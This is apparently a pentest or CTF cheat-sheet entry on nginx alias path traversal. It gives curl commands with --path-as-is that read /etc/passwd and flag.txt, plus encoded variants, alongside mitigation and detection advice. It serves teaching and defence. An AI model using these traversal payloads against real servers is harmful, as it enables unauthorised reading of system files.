---
topic: nginx alias traversal
tags: [web, nginx, path-traversal, misconfiguration]
---

# nginx alias traversal

**English** | [🇪🇸 Español](nginx-alias-traversal.md)

## Concept

nginx's `alias` directive replaces the URI part matching `location`. If the trailing slash is missing or the path is not normalized, `../` can resolve outside the intended directory and read arbitrary files.

## When it applies

- `location /static/ { alias /var/www/static/; }` with controlled paths.
- Configurations mixing `alias` and `root`.
- Proxies that do not normalize `..`.

## Requirements

1. A `location` using `alias`.
2. A request with `--path-as-is` to avoid client normalization.
3. A known target path.

## Procedure

```bash
curl --path-as-is 'http://<HOST>/assets/../../../../etc/passwd'
```

If `alias` lacks a trailing `/`, try direct concatenation:

```bash
curl --path-as-is 'http://<HOST>/assets../flag.txt'
```

Encode segments when a proxy is present:

```bash
curl --path-as-is 'http://<HOST>/assets/%2e%2e/%2e%2e/etc/passwd'
```

## Variants

- **Alias without trailing slash**: `alias /var/www/assets;`.
- **Location without slash**: `location /assets { ... }`.
- **Double encoding**: `%252e%252e`.
- **Proxy normalization**: test with and without `--path-as-is`.

## Limitations

- Modern nginx normalizes part of the path.
- A proxy/WAF may block `..`.
- The file must be readable by the nginx user.
- Not every `alias` is vulnerable.

## Mitigation

- Prefer `root` where possible.
- Add a trailing `/` and normalize.
- Reject `..` and validate the resolved path.
- Review configurations with `nginx -T`.

## Detection

- Requests with `../` or `%2e%2e`.
- Access to `/etc/passwd` or files outside the webroot.
- 200 on paths that should be 404.
- Directory fuzzing.

MITRE ATT&CK: T1190 (Exploit Public-Facing Application), T1083 (File and Directory Discovery).

## References

- <https://nginx.org/en/docs/http/ngx_http_core_module.html#alias>
- <https://owasp.org/www-community/attacks/Path_Traversal>
- <https://book.hacktricks.xyz/pentesting-web/file-inclusion>
